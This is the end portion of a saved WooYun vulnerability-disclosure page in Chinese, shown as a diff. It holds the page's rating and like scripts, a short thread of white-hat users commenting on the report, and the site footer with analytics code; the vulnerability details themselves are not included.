+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html(_LANGJS.RATING_SUCCESS);
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html(_LANGJS.LOGIN_FIRST);
+						break;
+					case 4:
+						$("#ratingShow").html(_LANGJS.RATING_BUGS_DONE);
+						break;
+					case 6:
+						$("#ratingShow").html(_LANGJS.RATING_BUGS_SELF);
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+<p class="detail">对本漏洞信息进行评价，以更好的反馈信息的价值，包括信息客观性，内容是否完整以及是否具备学习价值</p>
+		<h5 class="rating">
+		<div class="ratingText">漏洞评价<span>(共<span id="ratingSpan">0</span>人评价)</span>:</div>
+		<div class="myrating">
+			<span rel="-2" data-title="信息虚假或者没有任何自己的思考"></span>
+			<span rel="-1" data-title="内容不详并且漏洞信息评级及类型明显错误"></span>
+			<span rel="0" data-title="还可以，洞主继续努力"></span>
+			<span rel="1" data-title="信息完整，过程清晰，有截图有代码有视频有真相"></span>
+			<span rel="2" data-title="角度独特思路新颖值得学习"></span>
+			<div id="ratingShow">
+			登陆后才能进行评分			</div>
+		</div>
+		</h5>
+		<input type="hidden" id="myRating" value="" />
+
+<hr align="center" />
+<h2>评价</h2>
+
+<div id="replys" class="replys">
+	    <ol class="replylist">
+                <li class="reply clearfix">
+            <div class="reply-content">
+                <div class="reply-info">
+        <span class="addtime">2015-01-12 09:55</span> |
+    		<a target='_blank' href="http://www.wooyun.org/whitehats/疯狗">疯狗</a> <img height="12" width="12" style="vertical-align:-2px;" src="http://wooyun.org/images/v.png" alt="认证白帽子" />			<!-- 增加路人判断显示 @zm 2013-12-13 Begin -->
+			( 实习白帽子  |			<!-- 增加路人判断显示 @zm 2013-12-13 End -->
+        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)
+	
+	<div class="likebox">
+        <span class="likepre" title="赞！" rel="127744"></span>
+        <span class="liketext liketext_min"><span id="likenum_127744">1</span></span>
+        <span class="likesuf"></span>
+    </div>
+                </div><!-- reply-info End -->
+
+                <div class="description">
+                    <p>这提示有意思。。。 </p>
+                </div>
+
+                <div class="replylist-act">
+                		<span class="floor">1#</span>
+                        <a title="回复 疯狗" href="javascript:void(0)" class="replyBtn" onclick="Reply('疯狗')">回复此人</a>
+                </div>
+            </div><!-- reply-content End -->
+        </li>
+                <li class="reply clearfix">
+            <div class="reply-content">
+                <div class="reply-info">
+        <span class="addtime">2015-01-12 11:04</span> |
+    		<a target='_blank' href="http://www.wooyun.org/whitehats/孤独雪狼">孤独雪狼</a> <img height="12" width="12" style="vertical-align:-2px;" src="http://wooyun.org/images/v.png" alt="认证白帽子" />			<!-- 增加路人判断显示 @zm 2013-12-13 Begin -->
+			( 普通白帽子  |			<!-- 增加路人判断显示 @zm 2013-12-13 End -->
+        Rank:740 漏洞数:156        | 七夕手机被偷，这坑爹的七夕啊 。。。。)
+	
+	<div class="likebox">
+        <span class="likepre" title="赞！" rel="127769"></span>
+        <span class="liketext liketext_min"><span id="likenum_127769">1</span></span>
+        <span class="likesuf"></span>
+    </div>
+                </div><!-- reply-info End -->
+
+                <div class="description">
+                    <p>发现渣浪很少给20  呵呵  </p>
+                </div>
+
+                <div class="replylist-act">
+                		<span class="floor">2#</span>
+                        <a title="回复 孤独雪狼" href="javascript:void(0)" class="replyBtn" onclick="Reply('孤独雪狼')">回复此人</a>
+                </div>
+            </div><!-- reply-content End -->
+        </li>
+                <li class="reply clearfix">
+            <div class="reply-content">
+                <div class="reply-info">
+        <span class="addtime">2015-01-22 17:21</span> |
+    		<a target='_blank' href="http://www.wooyun.org/whitehats/wefgod">wefgod</a>			<!-- 增加路人判断显示 @zm 2013-12-13 Begin -->
+			( 核心白帽子 |			<!-- 增加路人判断显示 @zm 2013-12-13 End -->
+        Rank:1825 漏洞数:183        | 力不从心)
+	
+	<div class="likebox">
+        <span class="likepre" title="赞！" rel="129710"></span>
+        <span class="liketext liketext_min"><span id="likenum_129710">0</span></span>
+        <span class="likesuf"></span>
+    </div>
+                </div><!-- reply-info End -->
+
+                <div class="description">
+                    <p>很给力 </p>
+                </div>
+
+                <div class="replylist-act">
+                		<span class="floor">3#</span>
+                        <a title="回复 wefgod" href="javascript:void(0)" class="replyBtn" onclick="Reply('wefgod')">回复此人</a>
+                </div>
+            </div><!-- reply-content End -->
+        </li>
+                <li class="reply clearfix">
+            <div class="reply-content">
+                <div class="reply-info">
+        <span class="addtime">2015-02-23 00:14</span> |
+    		<a target='_blank' href="http://www.wooyun.org/whitehats/_Thorns">_Thorns</a>			<!-- 增加路人判断显示 @zm 2013-12-13 Begin -->
+			( 普通白帽子  |			<!-- 增加路人判断显示 @zm 2013-12-13 End -->
+        Rank:1712 漏洞数:261        )
+	
+	<div class="likebox">
+        <span class="likepre" title="赞！" rel="133863"></span>
+        <span class="liketext liketext_min"><span id="likenum_133863">0</span></span>
+        <span class="likesuf"></span>
+    </div>
+                </div><!-- reply-info End -->
+
+                <div class="description">
+                    <p>这个居然没加精。 </p>
+                </div>
+
+                <div class="replylist-act">
+                		<span class="floor">4#</span>
+                        <a title="回复 _Thorns" href="javascript:void(0)" class="replyBtn" onclick="Reply('_Thorns')">回复此人</a>
+                </div>
+            </div><!-- reply-content End -->
+        </li>
+                <li class="reply clearfix">
+            <div class="reply-content">
+                <div class="reply-info">
+        <span class="addtime">2015-02-26 11:12</span> |
+    		<a target='_blank' href="http://www.wooyun.org/whitehats/夏殇">夏殇</a>			<!-- 增加路人判断显示 @zm 2013-12-13 Begin -->
+			( 实习白帽子  |			<!-- 增加路人判断显示 @zm 2013-12-13 End -->
+        Rank:44 漏洞数:26        | 不忘初心，方得始终。)
+	
+	<div class="likebox">
+        <span class="likepre" title="赞！" rel="134073"></span>
+        <span class="liketext liketext_min"><span id="likenum_134073">0</span></span>
+        <span class="likesuf"></span>
+    </div>
+                </div><!-- reply-info End -->
+
+                <div class="description">
+                    <p>233 </p>
+                </div>
+
+                <div class="replylist-act">
+                		<span class="floor">5#</span>
+                        <a title="回复 夏殇" href="javascript:void(0)" class="replyBtn" onclick="Reply('夏殇')">回复此人</a>
+                </div>
+            </div><!-- reply-content End -->
+        </li>
+                <li class="reply clearfix">
+            <div class="reply-content">
+                <div class="reply-info">
+        <span class="addtime">2015-02-28 11:41</span> |
+    		<a target='_blank' href="http://www.wooyun.org/whitehats/wefgod">wefgod</a>			<!-- 增加路人判断显示 @zm 2013-12-13 Begin -->
+			( 核心白帽子 |			<!-- 增加路人判断显示 @zm 2013-12-13 End -->
+        Rank:1825 漏洞数:183        | 力不从心)
+	
+	<div class="likebox">
+        <span class="likepre" title="赞！" rel="134312"></span>
+        <span class="liketext liketext_min"><span id="likenum_134312">0</span></span>
+        <span class="likesuf"></span>
+    </div>
+                </div><!-- reply-info End -->
+
+                <div class="description">
+                    <p>很不错 </p>
+                </div>
+
+                <div class="replylist-act">
+                		<span class="floor">6#</span>
+                        <a title="回复 wefgod" href="javascript:void(0)" class="replyBtn" onclick="Reply('wefgod')">回复此人</a>
+                </div>
+            </div><!-- reply-content End -->
+        </li>
+                <li class="reply clearfix">
+            <div class="reply-content">
+                <div class="reply-info">
+        <span class="addtime">2015-03-08 15:02</span> |
+    		<a target='_blank' href="http://www.wooyun.org/whitehats/evil_webshell">evil_webshell</a>			<!-- 增加路人判断显示 @zm 2013-12-13 Begin -->
+			( 路人 |			<!-- 增加路人判断显示 @zm 2013-12-13 End -->
+        Rank:0 漏洞数:2        | 致力于web层面的安全，热爱黑客技术，正在...)
+	
+	<div class="likebox">
+        <span class="likepre" title="赞！" rel="135577"></span>
+        <span class="liketext liketext_min"><span id="likenum_135577">0</span></span>
+        <span class="likesuf"></span>
+    </div>
+                </div><!-- reply-info End -->
+
+                <div class="description">
+                    <p>很有新意的入侵方法 </p>
+                </div>
+
+                <div class="replylist-act">
+                		<span class="floor">7#</span>
+                        <a title="回复 evil_webshell" href="javascript:void(0)" class="replyBtn" onclick="Reply('evil_webshell')">回复此人</a>
+                </div>
+            </div><!-- reply-content End -->
+        </li>
+                <li class="reply clearfix">
+            <div class="reply-content">
+                <div class="reply-info">
+        <span class="addtime">2015-03-18 13:22</span> |
+    		<a target='_blank' href="http://www.wooyun.org/whitehats/pandas">pandas</a>			<!-- 增加路人判断显示 @zm 2013-12-13 Begin -->
+			( 普通白帽子  |			<!-- 增加路人判断显示 @zm 2013-12-13 End -->
+        Rank:701 漏洞数:79        | 国家一级保护动物)
+	
+	<div class="likebox">
+        <span class="likepre" title="赞！" rel="136934"></span>
+        <span class="liketext liketext_min"><span id="likenum_136934">0</span></span>
+        <span class="likesuf"></span>
+    </div>
+                </div><!-- reply-info End -->
+
+                <div class="description">
+                    <p>怎么感觉像@猪猪侠 的小号 </p>
+                </div>
+
+                <div class="replylist-act">
+                		<span class="floor">8#</span>
+                        <a title="回复 pandas" href="javascript:void(0)" class="replyBtn" onclick="Reply('pandas')">回复此人</a>
+                </div>
+            </div><!-- reply-content End -->
+        </li>
+            </ol><!-- replylist End -->
+</div><!-- replys End -->
+
+<div id="reply" class="reply">
+<a name="comment"></a>
+<p class="detail">
+登录后才能发表评论，请先 <a href="http://wooyun.org/user.php?action=login"><u>登录</u></a> 。
+</p>
+<script type="text/javascript">
+var masaic = '0';
+
+function CommentLike(id){
+	$.post("/ajaxdo.php?module=commentrating",{"id":id,"token":$("#token").val()},function(re){
+		re=parseInt(re);
+		switch(re){
+			case 1:
+				$("#likenum_"+id).html(parseInt($("#likenum_"+id).html())+1);
+				break;
+			case 4:
+				alert(_LANGJS.COMMENT_GOOD_DONE);
+				break;
+			case 6:
+				alert(_LANGJS.COMMENT_SELF);
+				break;
+			default:break;
+		}
+	});
+}
+$(document).ready(function(){
+	$(".likebox .likepre").click(function(){
+            CommentLike($(this).attr("rel"));
+        });
+});
+
+
+</script>
+<div>
+	</div>
+	<div id="footer">
+        <span class="copyright fleft">
+    		Copyright &copy; 2010 - 2015 <a href="wooyun-2015-091301#">wooyun.org</a>, All Rights Reserved
+    		<a href="http://www.miibeian.gov.cn/">京ICP备15041338号-1</a>
+    		<!--a href="http://sae.sina.com.cn" target="_blank"><img src="/images/sae_bottom_logo.png" title="Powered by Sina App Engine"></a-->
+    	</span>
+        <span class="other fright">
+                        <a href="http://wooyun.org/impression">行业观点</a>
+            · <a href="http://wooyun.org/lawer">法律顾问</a>
+            · <a href="http://wooyun.org/contactus">联系我们</a>
+            · <a href="http://wooyun.org/help">帮助</a>
+            · <a href="http://wooyun.org/about">关于</a>
+        </span>
+    </div>
+	<script type="text/javascript">
+	var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+	document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fc12f88b5c1cd041a732dea597a5ec94c' type='text/javascript'%3E%3C/script%3E"));
+	</script>
+    <script type="text/javascript" id="bdshare_js" data="type=button" ></script>
+    <script type="text/javascript" id="bdshell_js"></script>
+    <script type="text/javascript">
+        document.getElementById("bdshell_js").src = "http://bdimg.share.baidu.com/static/js/shell_v2.js?cdnversion=" + new Date().getHours();
+        
+        if (top.location !== self.location) top.location=self.location;
+    </script>
+</body>
+</html>
